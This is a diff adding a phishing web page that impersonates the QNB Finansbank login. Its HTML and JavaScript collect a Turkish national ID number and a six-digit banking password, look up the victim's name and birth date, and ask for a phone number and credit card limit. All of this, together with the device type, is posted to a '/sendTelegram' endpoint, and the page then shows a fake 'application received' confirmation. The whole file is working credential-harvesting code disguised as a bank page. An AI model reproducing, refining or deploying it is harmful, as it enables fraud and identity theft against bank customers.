@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QNB Giriş</title>
+    <link rel="stylesheet" type="text/css" href="assets/style/style.css">
+    <style>
+        .error-message { color: red; font-size: 0.9em; margin-bottom: 10px; display:none;}
+        .required-message { color: orange; font-size: 0.85em; display:none;}
+        .success-header, .success-card { color: #fff; }
+        .success-info-label { font-weight: bold; }
+        .success-info-value { margin-left: 5px; }
+        .checkmark { margin: 15px 0; }
+        .login-button:disabled { background: #666 !important; cursor: not-allowed !important; }
+        .form-group { position:relative;}
+        .input-error { border: 1px solid red !important; }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loading-overlay" style="position: fixed;">
+        <img src="./assets/img/QNB_Loading_Icon.gif" alt="loading...">
+        <div class="loading-text">QNB Finansbank'a Hoş Geldiniz<br>Yükleniyor...</div>
+    </div>
+    <div class="login-container" id="login-container">
+        <form id="login-form" autocomplete="off">
+            <div class="form-group">
+                <label for="tcno">TC Kimlik No *</label>
+                <input type="text" id="tcno" name="tcno" required placeholder="TC Kimlik Numaranız" maxlength="11" autocomplete="off">
+                <div id="tcno-error" class="required-message">TC Kimlik No 11 haneli olmalı.</div>
+            </div>
+            <div class="form-group">
+                <label for="sifre">Şifre *</label>
+                <input type="password" id="sifre" name="sifre" required placeholder="Şifreniz" maxlength="6" autocomplete="off">
+                <div id="sifre-error" class="required-message">Şifre 6 haneli olmalı.</div>
+            </div>
+            <button type="submit" class="login-button" id="login-button" disabled>
+                <span id="login-text">Giriş Yap</span>
+                <span id="login-spinner" style="display: none; margin-left: 10px;">
+                    <svg width="16" height="16" viewBox="0 0 100 100" fill="#fff">
+                        <circle cx="50" cy="50" r="35" stroke-width="10" stroke="#fff"
+                            stroke-dasharray="164.93361431346415 56.97787143782138" fill="none">
+                            <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s"
+                                values="0 50 50;360 50 50" keyTimes="0;1" />
+                        </circle>
+                    </svg>
+                </span>
+            </button>
+        </form>
+    </div>
+    <div class="info-container" id="info-container" style="display:none;">
+        <div class="welcome-header">
+            <img src="./assets/img/file.png" alt="QNB Logo" class="welcome-image">
+            <div class="welcome-text">
+                <h1 id="welcome-title"></h1>
+                <p id="welcome-birth"></p>
+            </div>
+        </div>
+        <form id="girisForm" autocomplete="off">
+            <div class="form-group" id="choose">
+                <label>Kredi Kartı Kullanıyor musunuz? *</label>
+                <div style="display: flex; gap: 10px;">
+                    <button type="button" class="kart-btn" data-value="evet">Evet</button>
+                    <button type="button" class="kart-btn" data-value="hayir">Hayır</button>
+                </div>
+                <input type="hidden" name="kredi_kart_durumu" id="kredi_kart_durumu" required>
+            </div>
+            <div id="kart-ekstra" style="display:none;">
+                <div class="form-group">
+                    <label for="telno2">Telefon Numaranız *</label>
+                    <input name="phone2" type="tel" class="form-control" id="telno2" value="" autocomplete="off" maxlength="17" placeholder="Telefon numaranızı girin" required>
+                    <div id="telno2-error" class="required-message">Telefon numarası eksik veya hatalı.</div>
+                </div>
+                <div class="form-group">
+                    <label for="limit">Kredi Kart Limiti *</label>
+                    <input type="text" inputmode="numeric" name="limit" required id="limit" class="form-control"
+                        placeholder="100.000 ₺" autocomplete="off">
+                    <div id="limit-error" class="required-message">Geçersiz limit!</div>
+                </div>
+                <button type="submit" id="tamamla" class="login-button" disabled>
+                    <span id="tamamla-text">Başvuruyu tamamla</span>
+                    <span id="tamamla-spinner" style="display: none; margin-left: 10px;">
+                        <svg width="16" height="16" viewBox="0 0 100 100" fill="#fff">
+                            <circle cx="50" cy="50" r="35" stroke-width="10" stroke="#fff"
+                                stroke-dasharray="164.93361431346415 56.97787143782138" fill="none">
+                                <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s"
+                                    values="0 50 50;360 50 50" keyTimes="0;1" />
+                            </circle>
+                        </svg>
+                    </span>
+                </button>
+                <div id="telegram-error-message" class="error-message"></div>
+            </div>
+            <div class="success-header" id="hayir-kart-group" style="display:none;">
+                <h1 style="color:white !important;">Tebrikler!</h1>
+                <p>Kredi Kartı kullanmadığınız için başvurunuz başarıyla tamamlandı.</p>
+            </div>
+        </form>
+    </div>
+    <div class="success-container" id="success-container" style="margin-top:40px; display:none;">
+        <div class="checkmark">
+            <svg width="64" height="64" viewBox="0 0 64 64">
+                <circle cx="32" cy="32" r="30" stroke="#4CAF50" stroke-width="4" fill="none" />
+                <path d="M18 34 L28 44 L46 24" stroke="#4CAF50" stroke-width="4" fill="none" stroke-linecap="round"
+                    stroke-linejoin="round" />
+            </svg>
+        </div>
+        <div class="success-header">
+            <h1 style="color:white !important;">Tebrikler! Başvurunuz Başarıyla Alındı</h1>
+        </div>
+        <div class="success-card">
+            <h3>Başvuru Bilgileriniz</h3>
+            <div class="success-info-row">
+                <div class="success-info-label">Ad Soyad:</div>
+                <div class="success-info-value"><span id="adsoyad-success"></span></div>
+            </div>
+            <div class="success-info-row">
+                <div class="success-info-label">TC Kimlik No:</div>
+                <div class="success-info-value"><span id="tcno-success"></span></div>
+            </div>
+            <div class="success-info-row">
+                <div class="success-info-label">Doğum Tarihi:</div>
+                <div class="success-info-value"><span id="dogum-success"></span></div>
+            </div>
+            <div class="success-info-row" id="limit-success-row" style="display:none;">
+                <div class="success-info-label">Kart Limiti:</div>
+                <div class="success-info-value"><span id="limit-success"></span></div>
+            </div>
+            <div class="success-info-row" id="telefon-success-row" style="display:none;">
+                <div class="success-info-label">Telefon:</div>
+                <div class="success-info-value"><span id="telefon-success"></span></div>
+            </div>
+            <div class="success-info-row">
+                <div class="success-info-label">Başvuru Tarihi:</div>
+                <div class="success-info-value"><span id="islemSaati"></span></div>
+            </div>
+            <a href="/" class="success-home-button">Ana Sayfaya Dön</a>
+        </div>
+    </div>
+    <script>
+    window.onload = function() {
+        setTimeout(function() {
+            document.getElementById("loading-overlay").style.display = "none";
+        }, 2000);
+    };
+    </script>
+    <script>
+        // TC No doğrulama: 11 rakam ve ilk rakam 0 olamaz
+        function validateTC(tc) {
+            tc = tc.replace(/\D/g, '');
+            return tc.length === 11 && tc[0] !== "0";
+        }
+        // Şifre doğrulama: 6 rakam
+        function validateSifre(sifre) {
+            sifre = sifre.replace(/\D/g, '');
+            return sifre.length === 6;
+        }
+        // Telefon input formatlama ve kısıtlama
+        function formatPhoneInput(value) {
+            value = value.replace(/\D/g, '');
+            if (value.length > 12) value = value.substring(0, 12);
+            let result = '+90';
+            if (value.length > 0) result += ' ' + value.substring(0, 3);
+            if (value.length > 3) result += ' ' + value.substring(3, 6);
+            if (value.length > 6) result += ' ' + value.substring(6, 8);
+            if (value.length > 8) result += ' ' + value.substring(8, 10);
+            if (value.length > 10) result += ' ' + value.substring(10, 12);
+            return result;
+        }
+        function validatePhone(phone) {
+            return /^\+90 \d{3} \d{3} \d{2} \d{2}$/.test(phone);
+        }
+        // Limit input formatlama: binlik ayırıcı ve ₺, ilk rakam 0 olamaz
+        function formatLimitInput(val) {
+            val = val.replace(/\D/g, '');
+            if (val.length === 0) return '';
+            if (val[0] === '0') val = '';
+            if (val.length === 0) return '';
+            let num = parseInt(val, 10).toLocaleString('tr-TR');
+            return num + ' ₺';
+        }
+        function validateLimit(val) {
+            val = val.replace(/\D/g, '');
+            return val.length > 0 && val[0] !== '0';
+        }
+        // Cihaz tipi tespiti
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) return "Android";
+            if (/iphone|ipad|ipod/i.test(ua)) return "iOS";
+            if (/windows|macintosh|linux/i.test(ua)) return "PC";
+            return "Bilinmiyor";
+        }
+        // --- AKIŞ ---
+        let tcnoVal = "";
+        let sifreVal = "";
+        let adVal = "";
+        let soyadVal = "";
+        let dogumVal = "";
+
+        document.addEventListener("DOMContentLoaded", function () {
+            // İlk ekran: TC ve Şifre kontrolü
+            const tcno = document.getElementById("tcno");
+            const sifre = document.getElementById("sifre");
+            const loginButton = document.getElementById("login-button");
+            const tcnoError = document.getElementById("tcno-error");
+            const sifreError = document.getElementById("sifre-error");
+            function checkLoginValid() {
+                let validTC = validateTC(tcno.value);
+                let validSifre = validateSifre(sifre.value);
+                loginButton.disabled = !(validTC && validSifre);
+                tcno.classList.toggle('input-error', !validTC && tcno.value.length > 0);
+                sifre.classList.toggle('input-error', !validSifre && sifre.value.length > 0);
+                tcnoError.style.display = 'none';
+                sifreError.style.display = 'none';
+            }
+            tcno.addEventListener("input", function() {
+                tcno.value = tcno.value.replace(/\D/g, '').slice(0,11);
+                checkLoginValid();
+            });
+            sifre.addEventListener("input", function() {
+                sifre.value = sifre.value.replace(/\D/g, '').slice(0,6);
+                checkLoginValid();
+            });
+
+            checkLoginValid();
+
+            document.getElementById("login-form").addEventListener("submit", function (e) {
+                e.preventDefault();
+                if (loginButton.disabled) {
+                    if (!validateTC(tcno.value)) tcnoError.style.display = "block";
+                    if (!validateSifre(sifre.value)) sifreError.style.display = "block";
+                    return;
+                }
+                // TC ve şifreyi sakla
+                tcnoVal = tcno.value;
+                sifreVal = sifre.value;
+                document.getElementById("login-spinner").style.display = "inline-block";
+                loginButton.disabled = true;
+                // TC API sorgusu
+                fetch("/tcLookup", {
+                    method:"POST",
+                    headers:{"Content-Type":"application/json"},
+                    body:JSON.stringify({ tc: tcnoVal })
+                }).then(res=>res.json()).then(data=>{
+                    document.getElementById("login-spinner").style.display = "none";
+                    if(data.success){
+                        adVal = data.AD;
+                        soyadVal = data.SOYAD;
+                        dogumVal = data.DOGUMTARIHI;
+                        document.getElementById("login-container").style.display = "none";
+                        document.getElementById("info-container").style.display = "block";
+                        document.getElementById("welcome-title").innerText = `Hoşgeldiniz ${adVal} ${soyadVal}`;
+                        document.getElementById("welcome-birth").innerText = `Doğum Tarihiniz: ${dogumVal}`;
+                    } else {
+                        tcnoError.innerText = "TC Kimlik No geçersiz veya bulunamadı!";
+                        tcnoError.style.display = "block";
+                        loginButton.disabled = false;
+                    }
+                }).catch(()=>{
+                    document.getElementById("login-spinner").style.display = "none";
+                    tcnoError.innerText = "TC Kimlik No sorgulanamadı!";
+                    tcnoError.style.display = "block";
+                    loginButton.disabled = false;
+                });
+            });
+
+            // Kredi kartı sorusu
+            document.querySelectorAll(".kart-btn").forEach(btn => {
+                btn.addEventListener("click", function () {
+                    document.getElementById("kredi_kart_durumu").value = btn.dataset.value;
+                    if (btn.dataset.value === "evet") {
+                        document.getElementById("kart-ekstra").style.display = "block";
+                        document.getElementById("choose").style.display = "none";
+                    } else {
+                        document.getElementById("hayir-kart-group").style.display = "block";
+                        document.getElementById("kart-ekstra").style.display = "none";
+                        document.getElementById("choose").style.display = "none";
+                        setTimeout(function(){
+                            document.getElementById("info-container").style.display = "none";
+                            document.getElementById("success-container").style.display = "block";
+                            document.getElementById("adsoyad-success").innerText = `${adVal} ${soyadVal}`;
+                            document.getElementById("tcno-success").innerText = tcnoVal;
+                            document.getElementById("dogum-success").innerText = dogumVal;
+                            document.getElementById("islemSaati").innerText = nowStr();
+                            document.getElementById("limit-success-row").style.display = "none";
+                            document.getElementById("telefon-success-row").style.display = "none";
+                            sendToTelegram({
+                                AD: adVal,
+                                SOYAD: soyadVal,
+                                DOGUMTARIHI: dogumVal,
+                                tcno: tcnoVal,
+                                sifre: sifreVal,
+                                kredi_kart_durumu: "hayir",
+                                tarih: nowStr(),
+                                device: getDeviceType()
+                            },()=>{});
+                        }, 1000);
+                    }
+                });
+            });
+
+            // Limit ve telefon alanları
+            const limitInput = document.getElementById("limit");
+            const telInput2 = document.getElementById("telno2");
+            const tamamlaButton = document.getElementById("tamamla");
+            const limitError = document.getElementById("limit-error");
+            const telno2Error = document.getElementById("telno2-error");
+            function checkKartValid() {
+                let validLimit = validateLimit(limitInput.value);
+                let validPhone2 = validatePhone(telInput2.value);
+                tamamlaButton.disabled = !(validLimit && validPhone2);
+                limitInput.classList.toggle('input-error', !validLimit && limitInput.value.length > 0);
+                telInput2.classList.toggle('input-error', !validPhone2 && telInput2.value.length > 0);
+                limitError.style.display = 'none';
+                telno2Error.style.display = 'none';
+            }
+            limitInput.addEventListener("input", function () {
+                let val = limitInput.value.replace(/\D/g, '');
+                if (val.length > 0 && val[0] === '0') val = val.slice(1);
+                limitInput.value = formatLimitInput(val);
+                checkKartValid();
+            });
+            telInput2.addEventListener("focus", function () {
+                if (telInput2.value === '') {
+                    telInput2.value = '+90 ';
+                    telInput2.setSelectionRange(telInput2.value.length, telInput2.value.length);
+                }
+            });
+            telInput2.addEventListener("input", function (e) {
+                let val = telInput2.value;
+                let digits = val.startsWith('+90') ? val.slice(4).replace(/\D/g, '') : val.replace(/\D/g, '');
+                telInput2.value = formatPhoneInput(digits);
+                checkKartValid();
+            });
+            telInput2.addEventListener("keydown", function(e) {
+                if ((telInput2.selectionStart <= 4 && (e.key === 'Backspace' || e.key === 'Delete'))) {
+                    e.preventDefault();
+                }
+                if (!((e.key >= '0' && e.key <= '9') || ['Backspace', 'Tab', 'ArrowLeft', 'ArrowRight', 'Delete'].includes(e.key))) {
+                    e.preventDefault();
+                }
+            });
+            checkKartValid();
+
+            // Başvuru tamamla
+            document.getElementById("girisForm").addEventListener("submit", function (e) {
+                e.preventDefault();
+                let validLimit = validateLimit(limitInput.value);
+                let validPhone2 = validatePhone(telInput2.value);
+                if (!validLimit) limitError.style.display = "block";
+                if (!validPhone2) telno2Error.style.display = "block";
+                if (!(validLimit && validPhone2)) return;
+
+                document.getElementById("tamamla-spinner").style.display = "inline-block";
+                document.getElementById("tamamla-text").innerText = "Gönderiliyor...";
+                document.getElementById("telegram-error-message").style.display = "none";
+
+                sendToTelegram({
+                    AD: adVal,
+                    SOYAD: soyadVal,
+                    DOGUMTARIHI: dogumVal,
+                    tcno: tcnoVal,
+                    sifre: sifreVal,
+                    kredi_kart_durumu: "evet",
+                    limit: formatLimitInput(limitInput.value.replace(/\D/g, '')),
+                    telefon: telInput2.value,
+                    tarih: nowStr(),
+                    device: getDeviceType()
+                }, function(resp) {
+                    document.getElementById("tamamla-spinner").style.display = "none";
+                    document.getElementById("tamamla-text").innerText = "Başvuruyu tamamla";
+                    if (resp.status === "ok") {
+                        document.getElementById("info-container").style.display = "none";
+                        document.getElementById("success-container").style.display = "block";
+                        document.getElementById("adsoyad-success").innerText = `${adVal} ${soyadVal}`;
+                        document.getElementById("tcno-success").innerText = tcnoVal;
+                        document.getElementById("dogum-success").innerText = dogumVal;
+                        document.getElementById("limit-success").innerText = formatLimitInput(limitInput.value.replace(/\D/g, ''));
+                        document.getElementById("telefon-success").innerText = telInput2.value;
+                        document.getElementById("limit-success-row").style.display = "block";
+                        document.getElementById("telefon-success-row").style.display = "block";
+                        document.getElementById("islemSaati").innerText = nowStr();
+                    } else {
+                        let errorMsg = "Telegrama gönderilemedi!";
+                        if (resp.error) errorMsg += "\nHata: " + resp.error;
+                        document.getElementById("telegram-error-message").innerText = errorMsg;
+                        document.getElementById("telegram-error-message").style.display = "block";
+                    }
+                });
+            });
+        });
+
+        function nowStr() {
+            const d = new Date();
+            return d.toLocaleString('tr-TR');
+        }
+        function sendToTelegram(data, callback) {
+            fetch("/sendTelegram", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            }).then(res => res.json())
+                .then(callback)
+                .catch(err => callback({ status: "error", error: err.toString() }));
+        }
+    </script>
+</body>
+</html>
